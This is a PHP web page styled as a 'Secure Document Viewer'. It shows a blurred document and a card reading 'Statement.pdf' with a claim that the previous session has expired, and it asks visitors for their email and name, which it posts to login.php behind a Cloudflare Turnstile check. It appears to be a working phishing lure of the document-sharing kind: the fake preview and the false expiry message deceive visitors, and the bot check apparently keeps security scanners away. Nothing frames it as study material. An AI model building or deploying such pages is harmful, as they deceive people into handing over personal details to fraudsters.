<?php session_start(); ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Document Viewer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Cloudflare Turnstile -->
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<style>
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
    font-family: system-ui, sans-serif;
    background: #111;
    color: #222;
    min-height: 100vh;
}

.page-wrapper {
    position: relative;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
}

.doc-background {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    filter: blur(6px);
    transform: scale(1.02);
    opacity: 0.7;
}

.doc-background img {
    max-width: 100%;
    max-height: 100vh;
    object-fit: contain;
}

.page-wrapper::before {
    content: "";
    position: absolute;
    inset: 0;
    background: radial-gradient(circle, rgba(0,0,0,0.15), rgba(0,0,0,0.7));
}

.login-card {
    position: relative;
    z-index: 2;
    width: 90%;
    max-width: 330px;
    background: #f5f5f5;
    padding: 20px 26px;
    border-radius: 6px;
    box-shadow: 0 20px 40px rgba(0,0,0,0.35);
}

.doc-icon {
    width: 40px;
    height: 40px;
    margin: 0 auto 10px;
    overflow: hidden;
}

.doc-icon img { width: 100%; height: 100%; object-fit: contain; }

.doc-title {
    font-size: 15px;
    font-weight: 600;
    text-align: center;
}
.doc-size { font-size: 11px; color: #666; }

.doc-subtitle {
    margin-top: 6px;
    text-align: center;
    font-size: 11px;
    color: #666;
}

.login-error {
    margin-top: 10px;
    color: red;
    text-align: center;
    font-size: 12px;
}

.field-wrapper { margin: 12px 0; }

input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
}

.btn-primary {
    width: 100%;
    margin-top: 12px;
    padding: 11px;
    border: none;
    background: #1a73e8;
    color: #fff;
    font-size: 15px;
    border-radius: 4px;
}

.cf-turnstile {
    margin-bottom: 6px !important;
    transform: scale(0.90);
    transform-origin: 0 0;
}
</style>
</head>
<body>

<div class="page-wrapper">
    <div class="doc-background">
        <img src="assets/background.png">
    </div>

    <div class="login-card">
        <div class="doc-icon"><img src="assets/PDtrans.png"></div>

        <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
        <p class="doc-subtitle">Previous session has expired, log in to continue.</p>

        <?php if (!empty($_SESSION['error_message'])): ?>
            <p class="login-error"><?= $_SESSION['error_message']; unset($_SESSION['error_message']); ?></p>
        <?php endif; ?>

        <form method="POST" action="login.php">

            <!-- Turnstile -->
            <div class="cf-turnstile"
                 data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"
                 data-theme="light"></div>

            <div class="field-wrapper">
                <input type="email" name="email"
                    value="<?= isset($_SESSION['old_email']) ? htmlspecialchars($_SESSION['old_email']) : '' ?>"
                    placeholder="Enter your email" required>
            </div>

            <div class="field-wrapper">
                <input type="text" name="name" placeholder="Enter your name" required>
            </div>

            <button class="btn-primary">Next</button>
        </form>

    </div>
</div>

</body>
</html>
